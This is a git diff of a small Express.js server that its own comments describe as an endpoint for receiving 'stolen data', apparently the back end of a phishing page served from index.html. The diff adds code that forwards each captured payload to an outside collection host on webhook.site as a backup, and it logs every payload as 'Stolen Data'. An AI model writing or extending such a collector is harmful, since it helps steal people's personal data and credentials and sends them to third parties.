@@ -1,17 +1,32 @@
 const express = require('express');
 const app = express();
-app.use(express.json());
-app.use(express.static('.')); // Serve index.html
 
-// Endpoint to receive stolen data
+// Use the variable from Railway, or fallback to a dummy if running locally
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://webhook.site/your-default-id'; 
+
+app.use(express.json());
+app.use(express.static('.')); // Serves index.html
+
 app.post('/webhook', (req, res) => {
     const data = req.body;
-    console.log("🔥 New Stolen Data:", data);
     
-    // Optional: Log to a file or send to Discord embed here
+    // Log it to console so you can see it in Railway logs
+    console.log("🔥 Stolen Data:", data);
+    
+    // Optional: Send it to your actual Webhook.site URL too for redundancy
+    try {
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {
+        console.error("Failed to send to webhook site", e);
+    }
+
     res.json({ status: "ok" });
 });
 
 app.listen(process.env.PORT || 3000, () => {
-    console.log('Server running on port ' + process.env.PORT);
+    console.log(`Server running on port ${process.env.PORT}`);
 });
